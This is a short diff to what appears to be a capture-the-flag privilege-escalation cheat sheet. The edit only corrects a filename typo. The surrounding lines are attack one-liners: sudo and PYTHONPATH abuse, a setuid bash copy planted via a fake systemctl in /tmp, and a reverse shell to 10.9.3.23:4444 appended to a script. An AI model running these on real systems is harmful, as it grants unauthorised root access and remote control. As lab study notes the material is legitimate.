@@ -42,7 +42,7 @@ sudo -u silvio /usr/bin/zip # run with another user
 sudo -u jordan PYTHONPATH=/tmp /opt/scripts/flag.py # run with PYTHONPATH 
 
 echo 'import pty;pty.spawn("/bin/bash")' >> /tmp/shop.py
-echo 'cp /bin/bash /tmp/bash ; chmod +s /tmp/bash' > /tmp/systeemctl
+echo 'cp /bin/bash /tmp/bash ; chmod +s /tmp/bash' > /tmp/systemctl
 echo "bash -i >& /dev/tcp/10.9.3.23/4444 0>&1" >> /opt/scripts/flag.sh
 export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games
 ```
